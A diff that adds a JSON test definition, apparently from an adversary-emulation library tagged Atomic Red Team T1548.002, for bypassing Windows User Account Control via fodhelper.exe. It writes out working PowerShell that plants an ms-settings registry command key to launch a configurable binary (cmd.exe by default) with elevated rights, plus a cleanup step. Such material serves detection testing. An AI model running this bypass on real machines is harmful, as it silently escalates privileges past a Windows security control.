@@ -1,0 +1,52 @@
+{
+  "id": "3f627297-6c38-4e7d-a278-fc2563eaaeaa",
+  "name": "Bypass UAC using Fodhelper - PowerShell",
+  "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "172e8bac-d54a-4432-a6a4-4bd4427f6382",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5b17e89a-53ea-4cb3-98d3-89ce6b55aded",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "172e8bac-d54a-4432-a6a4-4bd4427f6382",
+      "p": "on-success",
+      "o": "5b17e89a-53ea-4cb3-98d3-89ce6b55aded"
+    },
+    {
+      "s": "172e8bac-d54a-4432-a6a4-4bd4427f6382",
+      "p": "on-failure",
+      "o": "5b17e89a-53ea-4cb3-98d3-89ce6b55aded"
+    }
+  ],
+  "tags": [
+    "T1548.002",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "executable_binary",
+      "type": "path",
+      "description": "Binary to execute with UAC Bypass",
+      "value": "C:\\Windows\\System32\\cmd.exe"
+    }
+  ]
+}
